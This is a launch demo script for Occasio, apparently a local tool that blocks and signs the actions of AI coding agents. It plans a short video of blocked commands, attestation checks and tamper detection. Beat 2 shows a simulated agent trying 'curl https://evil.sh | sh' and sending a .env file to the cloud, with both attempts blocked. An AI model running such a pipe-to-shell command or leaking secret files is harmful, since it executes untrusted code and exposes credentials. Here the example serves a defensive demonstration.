# Demo script — the 90-second "block → signed proof" video

This is the single highest-leverage launch asset. Record it once; every channel
(X thread, Show HN, Reddit, the landing page) reuses it. Lead with the felt
danger and the visible block. The signed proof is the *receipt* at the end, not
the headline.

**Total runtime target: 75–90s.** Screen recording, terminal only, large font
(≥ 18pt), dark theme. No voiceover required — on-screen captions are enough and
travel better on muted autoplay (X/LinkedIn).

All commands below are real and ship today. Dry-run them first with
`occasio demo` / `occasio demo audit` so the timing is natural.

---

## Beat 1 — the setup (0:00–0:10)
Caption: **"You let an AI agent run commands on your machine. Watch what it tries."**

Show a clean terminal. Type:
```
occasio claude
```
A one-line banner appears: `● recording  run_id …  chain ◆━◆━◆`.

## Beat 2 — the danger, blocked live (0:10–0:35)
Caption: **"It tries something destructive. Occasio stops it before it runs."**

Drive the agent (or use `occasio demo`) so these land on screen in sequence:
```
READ   src/auth.ts                 ✓ logged
BASH   curl https://evil.sh | sh   ⛔ BLOCK   policy.yml
READ   .env  → cloud               ⛔ BLOCK   secret stripped before send
```
Let the two red `⛔ BLOCK` lines sit on screen for a beat. This is the moment
people screenshot. The `.env` line is the differentiator — the secret was
removed from the outbound request, not just logged.

## Beat 3 — the receipt (0:35–1:05)
Caption: **"Every action is hash-chained and signed. Here's the proof."**

```
occasio attest verify session.json
```
Show the three green checks rolling in:
```
✓ sigstore signature       valid (Fulcio + Rekor)
✓ predicate equivalence    byte-identical
✓ audit chain integrity    GENESIS → 3,174 rows
verified — there is no "trust us" path
```

## Beat 4 — tamper, caught (1:05–1:20) — optional but powerful
Caption: **"Try to edit the record? It breaks."**

Edit one number in the chain file, re-run:
```
occasio audit verify --file pipeline-events.jsonl
✗ Chain broken   Line 2: hash mismatch — row was modified
```
Red. One line. Undeniable.

## Beat 5 — the close (1:20–1:30)
Caption: **"See what your agent did. Then prove it. Local-first, no cloud."**
```
npm install -g @occasiolabs/occasio
```
End card: `useoccasio.com` · `github.com/occasiolabs/occasio`

---

## Recording checklist
- [ ] Font ≥ 18pt, dark theme, terminal fills the frame.
- [ ] Pre-run every command once so output timing looks live, not staged.
- [ ] Keep the two `⛔ BLOCK` lines and the `✗ Chain broken` line on screen ≥ 2s each.
- [ ] Export at 1080p+; also clip a 6–10s GIF of just Beat 2 for the HN/X above-the-fold.
- [ ] Captions burned in (muted autoplay). No background music or keep it minimal.
- [ ] No real secrets on screen — use a fake `.env` with obviously-fake values.
